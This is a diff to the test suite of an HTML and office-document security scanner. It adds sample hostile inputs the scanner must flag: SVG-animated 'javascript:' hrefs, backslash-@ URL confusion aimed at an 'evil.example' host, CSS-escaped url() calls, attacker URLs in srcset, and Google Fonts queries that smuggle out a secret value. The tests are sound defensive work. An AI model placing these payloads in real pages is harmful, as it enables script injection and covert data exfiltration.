+        doc('<svg><a href="#x"><rect width="1" height="1"/><set attributeName="href" to="javascript:1"/></a></svg>'): "attributeName=href",
+        # URL and CSS tokenising differentials
+        doc(head_extra='<script src="https://evil.example\\@cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js" integrity="sha384-AAAA" crossorigin="anonymous"></script>'): "backslash",
+        doc(f'<div style="background:\\75 rl({EVIL}/x.png)">x</div>'): "backslash escape",
+        doc(f'<style>@font-face{{font-family:z;src:url(https://fonts.gstatic.com/s/x.woff2)}}</style>'): "data: URIs",
+        doc(head_extra=f'<link rel="preload" as="image" imagesrcset="{EVIL}/p.png 1x">'): "not allowed",
+        doc(f'<img srcset="data:,x, {EVIL}/l.png 2x">'): "inline data",
+        doc(f'<a href="{EVIL}" rel="noopener\u00a0noreferrer">x</a>'): "non-ASCII whitespace",
+        # Google Fonts query and font-file path
+        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&text=secret4111">', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
+        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=secret%204111%20customer">', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
+        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&effect=fire">', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
+        # pinned-path shape
+        doc(head_extra='<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/" integrity="sha384-AAAA" crossorigin="anonymous"></script>'): "pinned-version path",
+        doc(head_extra='<script src="https://cdn.jsdelivr.net/npm/a@1.0.0/../../x.js" integrity="sha384-AAAA" crossorigin="anonymous"></script>'): "file name",
+        doc(head_extra='<script src="https://unpkg.com/a@1.0.0/x" integrity="sha384-AAAA" crossorigin="anonymous"></script>'): "file name",
     }
     for html, needle in bad.items():
         out = "\n".join(check_html(html))
         if needle == "":  # dynamic script injection: unpinned URL blocked at runtime by the exact-URL CSP, not by the scanner
             continue
-        assert needle in out, (html[:160], out)
-    # SVG and the other no-CSP formats are refused by extension
+        assert needle in out, (needle, html[:200], out)
+    # SVG, server-side-include and the other no-CSP formats are refused by extension; unknown extensions fail closed
     assert check(Path("x.svg"), "<svg/>") and check(Path("x.docm"))[0].startswith(".docm")
+    assert check(Path("x.shtml"), doc()) and check(Path("x.svgz"), "") and check(Path("x.foo"), doc()) and check(Path("x"), doc())
+    assert srcset_urls("data:,x, https://e/x.png 2x") == ["data:,x", "https://e/x.png"]
+    assert srcset_urls(f"{PNG} 1x,{PNG} 2x") == [PNG, PNG] and srcset_urls("a.png 1x, b.png") == ["a.png", "b.png"]
+    assert scheme_host("https://evil.example\\@cdnjs.cloudflare.com/x")[0] == "bad" and scheme_host(" java\tscript:1")[0] == "javascript"
+    assert check_csp(csp_text(), set(), set(), set()) == [] and "fonts.gstatic.com/s/" in csp_text()
     # OOXML
     rels = b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>'
     assert check_rels("r", rels % f'<Relationship Id="a" Type="{HYPERLINK_REL}" Target="https://x" TargetMode="External"/>'.encode()) == []
